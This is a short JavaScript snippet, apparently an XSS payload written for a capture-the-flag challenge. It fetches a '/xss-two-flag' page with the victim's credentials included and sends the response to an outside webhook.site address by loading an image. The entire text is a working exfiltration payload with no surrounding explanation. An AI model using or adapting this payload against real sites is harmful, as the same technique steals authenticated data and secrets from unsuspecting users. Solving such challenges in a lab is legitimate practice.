fetch(window.location.origin + '/xss-two-flag', { credentials: 'include' })
  .then(r => r.text())
  .then(flag => {
    new Image().src = 'https://webhook.site/df3cbd5e-ca31-4457-b8ff-ac4735fe041c?flag=' + encodeURIComponent(flag);
  });
